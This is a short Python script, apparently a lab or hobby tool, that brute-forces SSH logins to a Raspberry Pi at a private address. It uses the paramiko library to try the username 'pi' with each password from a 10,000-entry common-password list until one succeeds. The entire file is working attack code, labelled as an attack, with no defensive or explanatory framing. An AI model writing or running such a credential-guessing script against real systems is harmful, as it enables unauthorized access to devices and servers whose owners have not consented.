import paramiko

# Target Raspberry Pi details
target_ip = "10.60.161.60"
username = "pi"
password_file = r"10k-most-common.txt"

# Function to try SSH login
def ssh_bruteforce():
    with open(password_file, "r") as file:
        for password in file:
            password = password.strip()
            print(f"[*] Trying: {password}")
            try:
                # Create SSH client
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target_ip, username=username, password=password, timeout=1)
                print(f"[+] SUCCESS: Password found: {password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print("[-] Wrong password.")
            except paramiko.SSHException:
                print("[!] SSH blocked or rate-limited.")
            except Exception as e:
                print(f"[!] Error: {e}")

# Run the attack
ssh_bruteforce()
